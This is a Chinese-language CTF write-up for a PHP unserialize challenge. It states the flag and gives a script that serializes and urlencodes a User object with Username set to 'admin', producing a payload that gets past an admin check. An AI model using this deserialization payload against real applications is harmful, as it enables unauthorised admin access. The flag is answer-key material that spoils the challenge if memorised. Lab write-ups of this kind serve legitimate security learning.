#### [flag]

`ACTF{Very_esay_Unserialize!!!}`

#### [题解思路]

考点无非就是在`php`中，`private`标签的属性被序列化时会产生不可显示的字符`%00`。这时候我们要将结果`urlencode()`之后再输出。

```php
<?php
class User{
    private $Username = "admin";
    private $Password = "0xDktb111";

    function __construct(){
        $Username = "0xDktb";
        $Password = "0xDktb123";
    }


    function isAdmin(){
        if($this->Username == "admin"){
            return true;
        }
        return false;
    }

    function __destruct(){
        echo "Hello ".$this->Username;
    }
}

echo urlencode(serialize(new User()));

?>
```

运行就可以拿到payload。

![image-20210226170725132](https://i.loli.net/2021/02/26/dg4Y5Gueyxc2DCH.png)